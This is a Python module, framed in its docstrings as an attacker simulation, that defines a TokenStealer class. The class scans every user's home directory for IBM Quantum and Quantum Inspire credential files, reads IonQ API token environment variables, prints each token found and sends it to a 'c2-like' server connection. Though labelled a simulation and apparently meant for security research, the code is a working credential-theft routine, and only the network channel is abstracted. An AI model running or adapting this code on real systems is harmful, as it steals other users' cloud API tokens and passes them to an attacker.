"""
Simulate an attacker stealing tokens from known location.

In this module we have code responsible for simulating an attacker behavior
which may be running in the same machine as the user does. It will look for
specific locations where we may find connection details about various cloud providers
and send such tokens to a simulated connection to a c2-like server.
"""

import os
import json
import operator
import platform

from functools import reduce


class TokenStealer(object):
    """A class to handle the logic for simulating the token discovery."""

    def __init__(self, connection):
        """
        Initialize the TokenStealer instance.

        This class is responsible for stealing known quantum providers tokens.
        They can be stored in default path locations, or in environment variables.
        It searches for them in predefined locations, and sends them to a simulated "c2" server.

        Parameters
        ----------
        connection : communication.C2Communication
            Represents an active communication to the "c2" simulated server.
        """
        self._connection = connection
        self._data = {
            "IBM": {
                "path": os.path.join(".qiskit", "qiskit-ibm.json"),
                "keys": ["default-ibm-quantum", "token"],
            },
            "QI": {"path": os.path.join(".quantuminspire", "qirc"), "keys": ["token"]},
        }

        self._env = {"IonQ": ["IONQ_API_KEY", "IONQ_API_TOKEN", "QISKIT_IONQ_API_TOKEN"]}

        self.__initialize_system()

    def __initialize_system(self):
        """
        Initialize platform-dependant attributes.

        This is responsible for initializing the system-specific paths.
        For example they may be different in Linux vs Windows.
        More platforms can be added at a later date.

        Returns
        -------
        None
        """
        system = platform.system()
        if system == "Linux":
            self._d_path = r"/home"
        elif system == "Windows":
            self._d_path = r"c:\users"
        else:
            self._d_path = str()
            print("[-] Unsuported system %s" % (system))

    def run(self):
        """
        Search all registered predefined locations.

        We open path locations and known environment variables magic names
        to look for tokens and we are sending a '/token' message to the connection
        we were provided with.

        Returns
        -------
        None
        """
        for user in os.listdir(self._d_path):
            for key, value in list(self._data.items()):
                f_path = os.path.join(self._d_path, user, value["path"])
                if not os.path.isfile(f_path):
                    continue

                with open(f_path, "r") as f:
                    data = json.load(f)

                token = reduce(operator.getitem, value["keys"], data)
                print("[*] Found token for %s @ %s" % (key, token))

                self._connection.send("/token", {"provider": key, "token": token})

        for key, value in list(self._env.items()):
            for tenv in value:
                token = os.environ.get(tenv)
                if token:
                    print("[*] Found token for %s @ %s" % (key, token))
                    self._connection.send("/token", {"provider": key, "token": token})
